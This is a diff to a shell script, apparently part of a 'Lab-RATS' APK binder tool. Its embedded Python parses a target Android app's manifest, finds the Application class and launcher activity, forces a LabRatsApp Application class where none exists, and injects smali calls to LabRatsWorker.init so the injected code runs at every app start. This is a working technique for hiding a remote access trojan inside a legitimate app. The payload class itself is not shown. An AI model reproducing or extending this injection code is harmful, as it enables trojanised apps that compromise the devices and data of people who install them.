@@ -464,118 +464,154 @@ if [ -d "$TARGET_DIR/res" ]; then
     done
 fi
 
-# 7. Identify Launcher Activity
-echo -e "${CYAN}[*] Identifying Launcher Activity in target...${NC}"
+# 7 & 8. Identify & Inject Smali Hooks into Application Class & Launcher Activity
+echo -e "${CYAN}[*] Injecting Lab-RATS startup hooks into Application class & Launcher Activity...${NC}"
 
-PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" | head -n1 | cut -d'"' -f2)
+python3 - "$TARGET_DIR" << 'EOF'
+import sys, os, re, xml.etree.ElementTree as ET
 
-# POSIX-compliant awk compatible with BSD awk (macOS) and GNU awk (Linux)
-LAUNCHER_ACT=$(awk '
-BEGIN { RS="<activity|<activity-alias"; FS=">" }
-NR > 1 {
-    block = $0
-    if (block ~ /android\.intent\.category\.LAUNCHER/ && block ~ /android\.intent\.action\.MAIN/) {
-        match_start = index(block, "android:name=\"")
-        if (match_start > 0) {
-            sub_str = substr(block, match_start + 14)
-            quote_end = index(sub_str, "\"")
-            if (quote_end > 0) {
-                print substr(sub_str, 1, quote_end - 1)
-                exit
-            }
-        }
-    }
-}
-' "$TARGET_MANIFEST")
+target_dir = sys.argv[1]
+manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
 
-if [ -z "$LAUNCHER_ACT" ]; then
-    echo -e "${RED}[!] Could not detect target Launcher Activity in AndroidManifest.xml${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
-fi
+if not os.path.exists(manifest_path):
+    sys.exit(1)
 
-if [[ "$LAUNCHER_ACT" == .* ]]; then
-    LAUNCHER_ACT="${PKG_NAME}${LAUNCHER_ACT}"
-elif [[ "$LAUNCHER_ACT" != *.* ]]; then
-    LAUNCHER_ACT="${PKG_NAME}.${LAUNCHER_ACT}"
-fi
+try:
+    tree = ET.parse(manifest_path)
+    root = tree.getroot()
+    package_name = root.attrib.get('package', '')
+    app_elem = root.find('application')
 
-REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
-TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
+    classes_to_hook = []
 
-# Fallback: Check if LAUNCHER_ACT is an activity-alias pointing to targetActivity
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    TARGET_ACT=$(grep -B 2 -A 5 "android:name=\"$LAUNCHER_ACT\"" "$TARGET_MANIFEST" | grep -o 'android:targetActivity="[^"]*"' | head -n1 | cut -d'"' -f2)
-    if [ -n "$TARGET_ACT" ]; then
-        if [[ "$TARGET_ACT" == .* ]]; then
-            TARGET_ACT="${PKG_NAME}${TARGET_ACT}"
-        elif [[ "$TARGET_ACT" != *.* ]]; then
-            TARGET_ACT="${PKG_NAME}.${TARGET_ACT}"
-        fi
-        LAUNCHER_ACT="$TARGET_ACT"
-        REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
-        TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
-    fi
-fi
-
-# Final fallback: search by class basename
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    TARGET_SMALI_FILE=$(find "$TARGET_DIR" -name "$(basename "$REL_PATH")" | head -n1)
-fi
-
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    echo -e "${RED}[!] Could not find Smali file for launcher $LAUNCHER_ACT${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
-fi
-
-echo -e "${GREEN}[✓] Detected Launcher Activity: $LAUNCHER_ACT${NC}"
-echo -e "${GREEN}[✓] Located Smali file: $TARGET_SMALI_FILE${NC}"
-
-# 8. Inject Smali Hook via Python
-echo -e "${CYAN}[*] Injecting Lab-RATS startup hook into $TARGET_SMALI_FILE...${NC}"
-
-python3 - "$TARGET_SMALI_FILE" << 'EOF'
-import sys, re
-
-smali_path = sys.argv[1]
-with open(smali_path, 'r', encoding='utf-8') as f:
-    content = f.read()
-
-hook_call = "    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"
-
-if "Lcom/labs/labrats/LabRatsWorker;->init" not in content:
-    if re.search(r'\.method[^\n]*onCreate\(', content):
-        if "invoke-super {p0" in content:
-            content = content.replace("invoke-super {p0", hook_call + "    invoke-super {p0", 1)
-        elif ".prologue" in content:
-            content = content.replace(".prologue", ".prologue\n" + hook_call, 1)
+    # 1. Custom Application class or set fallback
+    if app_elem is not None:
+        app_name = app_elem.attrib.get('{http://schemas.android.com/apk/res/android}name')
+        if app_name:
+            if app_name.startswith('.'):
+                app_name = package_name + app_name
+            elif '.' not in app_name:
+                app_name = package_name + '.' + app_name
+            classes_to_hook.append(app_name)
         else:
-            content = re.sub(
-                r'(\.method[^\n]*onCreate\([^\n]*\n(?:\s*\.[^\n]*\n)*)',
-                r'\1' + hook_call,
-                content,
-                count=1
-            )
-    else:
-        new_on_create = (
-            "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
-            "    .locals 1\n"
-            "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n"
-            + hook_call +
-            "    return-void\n"
-            ".end method\n\n"
-        )
-        if ".end class" in content:
-            content = content.replace(".end class", new_on_create + ".end class")
-        else:
-            content += new_on_create
+            # Set fallback Application class to LabRatsApp
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                m_content = f.read()
+            if '<application' in m_content and 'android:name=' not in m_content.split('<application')[1].split('>')[0]:
+                m_content = m_content.replace('<application', '<application android:name="com.labs.labrats.LabRatsApp"', 1)
+                with open(manifest_path, 'w', encoding='utf-8') as f:
+                    f.write(m_content)
+                print("[✓] Set fallback Application class to com.labs.labrats.LabRatsApp")
 
-    with open(smali_path, 'w', encoding='utf-8') as f:
-        f.write(content)
+    # 2. Find Launcher Activity
+    if app_elem is not None:
+        for act in app_elem.findall('activity') + app_elem.findall('activity-alias'):
+            for intent in act.findall('intent-filter'):
+                has_main = False
+                has_launcher = False
+                for action in intent.findall('action'):
+                    if action.attrib.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
+                        has_main = True
+                for cat in intent.findall('category'):
+                    if cat.attrib.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.category.LAUNCHER':
+                        has_launcher = True
+
+                if has_main and has_launcher:
+                    act_name = act.attrib.get('{http://schemas.android.com/apk/res/android}name')
+                    if act_name:
+                        if act_name.startswith('.'):
+                            act_name = package_name + act_name
+                        elif '.' not in act_name:
+                            act_name = package_name + '.' + act_name
+
+                        # Resolve activity-alias targetActivity
+                        for alias in app_elem.findall('activity-alias'):
+                            alias_name = alias.attrib.get('{http://schemas.android.com/apk/res/android}name')
+                            if alias_name and (alias_name == act_name or alias_name.endswith('.' + act_name.split('.')[-1])):
+                                target_act = alias.attrib.get('{http://schemas.android.com/apk/res/android}targetActivity')
+                                if target_act:
+                                    if target_act.startswith('.'):
+                                        target_act = package_name + target_act
+                                    elif '.' not in target_act:
+                                        target_act = package_name + '.' + target_act
+                                    act_name = target_act
+                                    break
+
+                        classes_to_hook.append(act_name)
+                        break
+
+    hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"
+
+    for cls in set(classes_to_hook):
+        cls_rel_path = cls.replace('.', '/') + ".smali"
+        smali_file = None
+
+        for r, _, files in os.walk(target_dir):
+            if "smali" in r:
+                p = os.path.join(r, cls_rel_path)
+                if os.path.exists(p):
+                    smali_file = p
+                    break
+
+        if not smali_file:
+            bn = os.path.basename(cls_rel_path)
+            for r, _, files in os.walk(target_dir):
+                if bn in files:
+                    smali_file = os.path.join(r, bn)
+                    break
+
+        if smali_file and os.path.exists(smali_file):
+            with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+
+            if "Lcom/labs/labrats/LabRatsWorker;->init" in content:
+                print(f"[✓] {cls} is already hooked.")
+                continue
+
+            modified = False
+            if "onCreate(" in content:
+                def reg_replacer(match):
+                    header = match.group(1)
+                    body = match.group(2)
+                    reg_match = re.search(r'\.registers\s+(\d+)', header)
+                    if reg_match:
+                        reg_count = int(reg_match.group(1))
+                        if reg_count < 2:
+                            header = header.replace(f".registers {reg_count}", ".registers 2")
+                    return header + body + hook_code
+
+                pattern = r'(\.method\s+[^I]*onCreate\([^\n]*\n.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
+                if re.search(pattern, content, re.DOTALL):
+                    content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
+                    modified = True
+                else:
+                    content = re.sub(r'(\.method\s+[^I]*onCreate\([^\n]*\n)', r'\1' + hook_code, content, count=1)
+                    modified = True
+            elif "attachBaseContext(" in content:
+                content = re.sub(r'(\.method\s+[^I]*attachBaseContext\([^\n]*\n)', r'\1' + hook_code, content, count=1)
+                modified = True
+            else:
+                new_on_create = (
+                    "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
+                    "    .registers 2\n"
+                    "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n"
+                    + hook_code +
+                    "    return-void\n"
+                    ".end method\n\n"
+                )
+                if ".end class" in content:
+                    content = content.replace(".end class", new_on_create + ".end class")
+                    modified = True
+
+            if modified:
+                with open(smali_file, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                print(f"[✓] Injected Lab-RATS startup hook into {cls}")
+except Exception as e:
+    print(f"Hooking Error: {e}")
 EOF
 
-echo -e "${GREEN}[✓] Smali hook injected into $TARGET_SMALI_FILE.${NC}"
+echo -e "${GREEN}[✓] Smali hooks injected into Application and Launcher classes.${NC}"
 
 # Detect native Android SDK aapt / aapt2 binaries (prefer stable 30-34 aapt v1 to prevent AAPT2 exit code 138)
 AAPT1_BIN=""
